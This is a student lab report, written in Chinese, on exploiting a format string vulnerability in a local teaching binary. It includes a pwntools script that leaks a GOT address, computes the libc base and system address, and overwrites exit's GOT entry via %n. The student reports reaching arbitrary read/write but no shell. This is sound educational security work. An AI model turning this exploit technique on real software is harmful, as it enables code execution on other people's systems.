# 格式化字符串攻击
赵梓钧15300240008
## 实验内容
本地打开ida可以看到
![](https://i.imgur.com/ESZfhLV.png)
和通常我们看到的形式不同，printf的漏洞在于这个函数只有一个参数，所以我们可以这样尝试，输入aaaa%x%x%x%x
就会发现如图所示的情况
![](https://i.imgur.com/lhpUBHD.png)
同时注意到这个程序什么保护都没有打开，但是也没有自带的shellcode，老师的程序在我自己下载的虚拟机版本里面也拿不到shell，执行老师的程序，发现如图所示：
![](https://i.imgur.com/WHbpjEY.png)
现在一般不用c语言写脚本，老师函数的本意是内部调用这个函数然后可以在外部写入我们的shellcode，这样子可以执行shell命令，但是这个只限于本地调试，没什么实际意义，所以这道题我们只能实现读写任意地址。可以读写任意地址也就是可以getshell，但是这里不展示，我们采用python的pwntools作为开发工具，对于32位的系统pwntools有封装好的可以将原来表函数地址写城别的函数的地址，我们注意到这个printf函数，我们可先leak出来libc里的pritf函数以及此函数的printf函数这样子两者相减我们有：
$$func_addr-func_offset = libc_addr$$
所以我们得到了此程序的libc地址那么我们也就得到了这个程序的system函数的地址，此时我们可以将任意函数改写位system函数，然后我们将参数给成／bin／sh\0 就可以得到shell了，这里主要运用了这个格式化字符串漏洞的%n的写，由于函数给的buf空间较大，所以便于我们操作，多的不说直接上代码，以及运行结果
![](https://i.imgur.com/WSwWt3y.png)
```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 zzj <hzshang15@gmail.com>
#
# Distributed under terms of the MIT license.

"""

"""
from pwn import *

context.log_level = 'debug'

elf = ELF('./fmt_str')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

#leak_printf_addr
exit_got = elf.got['exit']
print hex(exit_got)
payload = p32(exit_got)+'%4$s'
# print '*'.encode('hex')
io = process(argv = ['./fmt_str',payload])

io.recvuntil('Address of text ')
str1 = io.recv()[8:]
# print str1
# print str1.encode('hex')
# # io.interactive()
io.close()
exit_addr = u32(str1[5:9])
print 'exit_addr:= %x ' % exit_addr

#get_system_addr
system_offset = libc.symbols['system']
exit_offset = libc.symbols['exit']
#print hex(system_offset),hex(print_offset)

libc_addr = exit_addr-exit_offset
print 'libc_addr:= %x' % (libc_addr)
system_addr = system_offset + libc_addr
print "system_addr = %x" % (system_addr)

#printf->system
payload = fmtstr_payload(4, {exit_got:system_addr} )
payload1 = payload.replace('3c%7$hhn','259c%7$hhn')
io1 = process(argv = ['./fmt_str',payload1])
# # pause()
# io1.sendline('/bin/sh \0')
io1.interactive()

```
## 感想
这次就是这个实验报告的全部内容，虽然没有拿到shell但是实现了任意地址的读写，老师利用c语言编写只限于本地调试，这个程序本身还是存在的一些问题，这个程序只是用来当作教学的示例程序，也就是说，他只是一个演示程序，没有涉及循环，以及别的函数的调用，所以我们用python并不能够很好的得到shell权限，这也是情理之中的事情。

